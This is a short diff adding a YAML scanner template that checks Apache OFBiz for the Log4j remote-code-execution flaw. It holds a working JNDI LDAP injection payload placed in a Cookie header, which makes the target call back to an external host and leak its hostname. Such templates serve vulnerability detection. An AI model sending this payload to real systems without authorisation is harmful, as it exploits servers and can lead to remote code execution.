@@ -1,0 +1,16 @@
+name: apache-ofbiz-log4j-rce
+set:
+  reverse: newReverse()
+  reverseHost: reverse.url.host
+  reverseURL: reverse.url.path
+rules:
+  - method: GET
+    path: /webtools/control/main HTTP/1.1
+    headers:
+      Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{reverseHost}}}
+    expression: |
+      reverse.wait(10)
+detail:
+  author: u21h2
+  links:
+        - https://github.com/u21h2/nacs
